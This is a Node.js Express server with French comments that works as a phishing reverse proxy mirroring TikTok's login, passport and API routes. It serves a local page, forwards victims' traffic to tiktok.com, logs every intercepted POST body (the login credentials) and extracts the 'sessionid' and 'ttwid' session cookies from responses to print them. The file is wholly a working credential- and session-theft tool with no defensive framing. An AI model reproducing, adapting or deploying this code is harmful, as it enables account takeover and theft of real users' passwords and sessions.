const express = require('express');
const { createProxyMiddleware } = require('http-proxy-middleware');
const path = require('path');

const app = express();
const PORT = process.env.PORT || 10000;

// 1. Servir les fichiers statiques (index.html)
app.use(express.static(path.join(__dirname)));

// 2. Configuration du Proxy "Miroir"
const proxyOptions = {
    target: 'https://www.tiktok.com',
    changeOrigin: true,
    secure: true,
    cookieDomainRewrite: { "*": "" },
    // On force le passage même si le chemin ne correspond pas parfaitement
    pathRewrite: {
        '^/login': '/login', 
    },
    onProxyReq: (proxyReq, req, res) => {
        // --- INTERCEPTION DES DONNÉES POST ---
        if (req.method === 'POST') {
            let body = '';
            req.on('data', chunk => { body += chunk; });
            req.on('end', () => {
                console.log("\n[!] DONNÉES INTERCEPTÉES :");
                console.log(decodeURIComponent(body));
                console.log("---------------------------\n");
            });
        }
        proxyReq.setHeader('Referer', 'https://www.tiktok.com/');
    },
    onProxyRes: (proxyRes, req, res) => {
        // --- INTERCEPTION DES COOKIES DE SESSION ---
        const cookies = proxyRes.headers['set-cookie'];
        if (cookies) {
            cookies.forEach(c => {
                if (c.includes('sessionid') || c.includes('ttwid')) {
                    console.log("\n✅ SESSION DÉTECTÉE : " + c.split(';')[0]);
                }
            });
        }
    }
};

// 3. Application du Proxy sur la route /login
// On utilise app.all pour accepter GET et POST
app.all('/login', createProxyMiddleware(proxyOptions));

// Proxy pour les autres routes techniques de TikTok
app.use(['/passport', '/api'], createProxyMiddleware(proxyOptions));

app.listen(PORT, () => {
    console.log("BACOPS PROXY : ECOUTE SUR /login");
});
